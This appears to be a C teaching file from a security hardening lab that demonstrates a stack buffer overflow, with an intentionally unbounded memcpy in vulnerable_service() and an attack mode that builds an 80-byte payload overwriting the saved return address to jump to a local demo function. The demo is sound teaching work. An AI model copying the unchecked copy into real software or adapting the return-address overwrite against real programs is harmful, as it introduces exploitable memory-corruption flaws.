/**
 * Linux Kernel Hardening Lab - Principles Track 3: Classic Buffer Overflow & RIP Hijacking
 * labs/principles/05-bof-rip/bof_demo.c
 *
 * Demonstrates:
 * 1. Stack memory smashing via boundary-check omission (strcpy).
 * 2. Step-by-step overwriting of: Local Buffer -> Saved RBP (SFP) -> Return Address (RET).
 * 3. Execution flow diversion to unreachable_target() function.
 * 4. Architectural contrast: Why modern mitigations (Stack Canary, ASLR, NX) are indispensable.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>

#define BUFFER_SIZE 64

/* Secret/Admin function that should NEVER be called normally */
__attribute__((noinline))
void unreachable_admin_shell(void)
{
    printf("\n");
    printf("============================================================\n");
    printf(" [!] CRITICAL SECURITY COMPROMISE: Control Flow Hijacked!\n");
    printf("============================================================\n");
    printf(" [★] CPU Instruction Pointer (RIP/PC) redirected to:\n");
    printf("     unreachable_admin_shell() at %p!\n", (void *)unreachable_admin_shell);
    printf(" [★] Attacker gained arbitrary code execution in target process.\n");
    printf("============================================================\n\n");
    exit(0);
}

/* Vulnerable function without bound checks */
__attribute__((noinline))
void vulnerable_service(const char *user_input, size_t input_len)
{
    char stack_buffer[BUFFER_SIZE];
    void *frame_addr = __builtin_frame_address(0);
    void **ret_addr_ptr = (void **)((uintptr_t *)frame_addr + 1);

    printf("--- [Stack State Before Input Copy] ---\n");
    printf("  stack_buffer[0] Address : %p\n", (void *)stack_buffer);
    printf("  Saved RBP (SFP) Address : %p\n", frame_addr);
    printf("  Saved RET Address       : %p (points to: %p)\n",
           (void *)ret_addr_ptr, *ret_addr_ptr);
    printf("  Buffer to RET Distance  : %ld bytes\n",
           (intptr_t)((uintptr_t)ret_addr_ptr - (uintptr_t)stack_buffer));
    printf("---------------------------------------\n");

    /* Vulnerable memory copy */
    memcpy(stack_buffer, user_input, input_len);

    printf("--- [Stack State After Input Copy] ---\n");
    printf("  Saved RET Address now   : %p (points to: %p)\n",
           (void *)ret_addr_ptr, *ret_addr_ptr);
    printf("---------------------------------------\n");
    printf("[+] vulnerable_service() executing 'ret' instruction...\n");
}

void run_normal_mode(void)
{
    printf("\n=== [Mode 1: Normal In-Bounds Operation] ===\n");
    const char safe_msg[] = "STATUS_NORMAL_TELEMETRY_PACKET_OK";
    printf("[+] Sending safe payload (%zu bytes) into %d-byte buffer.\n",
           strlen(safe_msg), BUFFER_SIZE);
    vulnerable_service(safe_msg, strlen(safe_msg) + 1);
    printf("[+] Clean return from vulnerable_service()! Normal workflow resumed.\n");
}

void run_attack_mode(void)
{
    printf("\n=== [Mode 2: Buffer Overflow & RIP Hijack Attack] ===\n");

    /* Calculate necessary payload size:
     * BUFFER_SIZE (64 bytes) + Saved RBP (8 bytes) + Return Address (8 bytes) = 80 bytes
     */
    size_t payload_len = BUFFER_SIZE + sizeof(void *) + sizeof(void *);
    char *payload = (char *)malloc(payload_len);
    if (!payload) return;

    /* Fill buffer with 'A' (0x41) */
    memset(payload, 'A', BUFFER_SIZE);

    /* Fill Saved Frame Pointer (SFP) with 'B' (0x42) */
    memset(payload + BUFFER_SIZE, 'B', sizeof(void *));

    /* Overwrite Return Address with unreachable_admin_shell address */
    void *target_addr = (void *)unreachable_admin_shell;
    memcpy(payload + BUFFER_SIZE + sizeof(void *), &target_addr, sizeof(void *));

    printf("[+] Fabricated Exploit Payload (%zu bytes):\n", payload_len);
    printf("    [0..63]  Buffer Padding   : 64 bytes of 'A' (0x41)\n");
    printf("    [64..71] SFP / Saved RBP  : 8 bytes of 'B' (0x42)\n");
    printf("    [72..79] Target RET Addr  : %p (unreachable_admin_shell)\n\n", target_addr);

    printf("[!] Delivering exploit payload into vulnerable_service()...\n");
    vulnerable_service(payload, payload_len);

    /* This line should never execute if RET is hijacked! */
    printf("[-] FATAL: Failed to redirect control flow.\n");
    free(payload);
}

int main(int argc, char *argv[])
{
    printf("============================================================\n");
    printf(" Classic Buffer Overflow & RIP Hijacking Simulator\n");
    printf("============================================================\n");
    printf("[*] Target Function unreachable_admin_shell : %p\n", (void *)unreachable_admin_shell);
    printf("[*] main() Function                         : %p\n", (void *)main);

    if (argc > 1 && strcmp(argv[1], "--attack") == 0) {
        run_attack_mode();
    } else {
        run_normal_mode();
        printf("\n[i] Run with './bof_demo --attack' or 'make run-attack' to observe control flow hijacking.\n");
    }

    return 0;
}
